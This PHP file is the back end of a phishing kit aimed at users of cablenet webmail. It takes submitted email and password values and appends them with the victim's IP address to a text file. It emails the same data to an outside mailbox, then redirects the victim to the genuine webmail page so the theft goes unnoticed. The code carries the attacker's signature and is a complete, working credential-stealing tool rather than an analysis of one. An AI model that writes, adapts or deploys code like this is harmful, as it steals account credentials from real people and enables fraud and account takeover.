<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email   : ".$_POST['username']."\n";
$message .= "Password   : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";

$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


$send = "eazy.lion@yandex.com";

$subject = "cablenet ! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: https://mail.cablenet.com.cy");

?>
